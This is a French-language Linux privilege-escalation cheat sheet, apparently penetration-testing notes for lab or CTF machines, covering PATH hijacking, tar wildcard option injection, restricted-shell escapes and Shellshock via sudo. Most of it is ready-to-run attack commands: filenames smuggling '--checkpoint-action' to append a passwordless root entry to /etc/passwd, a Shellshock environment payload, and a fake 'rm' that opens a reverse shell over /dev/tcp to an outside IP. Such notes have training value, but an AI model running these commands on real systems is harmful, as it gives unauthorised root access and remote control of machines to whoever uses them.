# 02-Escalade Basée sur l'Environnement

### Abus de la Variable PATH
> Manipuler la variable d'environnement `PATH` pour forcer l'exécution de notre code malveillant à la place des binaires légitimes.
> **Contexte Sudo :** Vérifier si le PATH utilisé par `sudo` est différent du PATH de l'utilisateur (`sudo -l` peut montrer `secure_path` ou des variables `env_keep` liées au PATH). Si `secure_path` est restrictif mais que des commandes spécifiques autorisées par sudo appellent d'autres binaires sans chemin absolu, un abus de PATH peut toujours être possible dans ce contexte plus limité.

```bash
# Ajouter le répertoire courant (.) au début de PATH
PATH=.:$PATH
export PATH

# Créer un binaire malveillant avec un nom commun (ex: ls)
echo 'echo "PATH ABUSE!!"; /bin/bash' > ls
chmod +x ls
ls  # Exécute notre script au lieu de la commande /bin/ls si le répertoire courant est consulté en premier
```

### Abus des Caractères Jokers (Wildcards)
> Abuser des caractères jokers (`*`, `?`, `[]`) dans les scripts, notamment ceux utilisés avec des commandes comme `tar` ou `chown` dans des tâches cron.

```bash
# Exemple : Exploiter une tâche cron utilisant tar avec un wildcard (*) de manière non sécurisée
# Supposons un cronjob comme : tar czf /backups/archive.tgz /home/user/*
# Nous créons des fichiers avec des options de tar dans leurs noms dans /home/user/
echo 'echo "root::0:0:root:/root:/bin/bash" >> /etc/passwd' > /home/user/root.sh
chmod +x /home/user/root.sh
touch "/home/user/--checkpoint-action=exec=sh root.sh"
touch "/home/user/--checkpoint=1"
# Attendre que le cronjob s'exécute. `tar` interprétera ces noms de fichiers comme des options.
```

### Évasion des Shells Restreints
> Techniques pour s'échapper d'un shell restreint (rbash, rksh, rzsh) qui limite les commandes exécutables.

```bash
# Substitution de commande
ls -l `pwd`

# Chaînage de commandes (si ; est autorisé)
ls;/bin/bash

# Utilisation de variables d'environnement (si la réassignation est possible)
SHELL=/bin/bash exec /bin/bash

# Utilisation de fonctions shell (si la définition de fonction est possible)
function evasionshell { /bin/bash; }; evasionshell
# Ou simplement :
mafonction() { /bin/bash; }
mafonction

# Autres commandes souvent utiles pour l'évasion :
# awk 'BEGIN {system("/bin/bash")}'
# find / -name nom_fichier -exec /bin/bash \;
# more /etc/passwd (puis !/bin/bash)
# less /etc/passwd (puis !/bin/bash)
# vi (puis :!/bin/bash)
# scp (pour transférer des fichiers)
# ssh (pour se connecter ailleurs)
# ftp (puis !/bin/bash)
```

### Variables d'Environnement Vulnérables
> Certaines variables d'environnement peuvent être exploitées si des programmes les utilisent de manière non sécurisée.

Exemple (Jordak - type Shellshock via `env` avec `sudo`) :
> Si `sudo -l` permet d'exécuter une commande avec la préservation de certaines variables d'environnement ou l'utilisation de `env`.
```bash
# Exploiter une vulnérabilité de type Shellshock si la cible est vulnérable et qu'on peut contrôler l'environnement d'un script bash
# Cela est plus spécifique à la vulnérabilité Shellshock (CVE-2014-6271) elle-même.
# L'exemple fourni semble être une tentative d'exploitation de Shellshock via la commande `env` avec `sudo`.
# Si `sudo -l` montre que l'utilisateur peut exécuter `env` ou une commande qui hérite de l'environnement :
sudo -u root env 'VAR=() { :;}; /bin/bash -i' # Tentative d'exploitation de Shellshock
# Ou si une commande spécifique est autorisée et qu'elle appelle un script bash vulnérable :
sudo /chemin/vers/script_bash_autorise
# Et si ce script est vulnérable à Shellshock et que nous pouvons injecter des variables d'environnement.

# Un exemple plus direct d'abus de variable d'environnement avec sudo :
# Si un script exécuté avec sudo utilise LD_PRELOAD ou PYTHONPATH de manière non sécurisée (voir section 05)
# Si des fichiers de configuration globaux comme /etc/profile, /etc/bash.bashrc, /etc/environment sont modifiables
# et qu'ils sont sourcés par des processus privilégiés, cela peut permettre de définir des variables d'environnement
# exploitables (ex: LD_PRELOAD, fonctions bash malveillantes).
```
*(Note: L'exemple original pour Jordak est une exploitation de type Shellshock. J'ai ajouté des clarifications. L'abus de `LD_PRELOAD` ou `PYTHONPATH` avec `sudo` est traité plus en détail dans la section 05.)*

---
### Techniques d'Élévation de Privilèges Linux dans des Box (Basées sur l'Environnement)

#### Exploitation du PATH (Exemple Shiftdel)
> Si un script privilégié exécute des commandes sans spécifier leur chemin absolu.
```bash
# Le script privilégié exécute 'rm' sans '/bin/rm'
# Créer un répertoire 'bin' dans notre $HOME (s'il est dans le PATH ou si on peut le mettre dans le PATH du script)
mkdir ~/bin
echo '#!/bin/bash' > ~/bin/rm
echo 'bash -i >& /dev/tcp/192.168.49.x/1234 0>&1' >> ~/bin/rm
chmod +x ~/bin/rm
# S'assurer que ~/bin est dans le PATH du script privilégié, ou que le script est exécuté depuis un répertoire où notre 'rm' sera trouvé en premier.
# export PATH=~/bin:$PATH # Si on peut influencer le PATH du processus privilégié
# Attendre que le script s'exécute avec des privilèges élevés.
``` 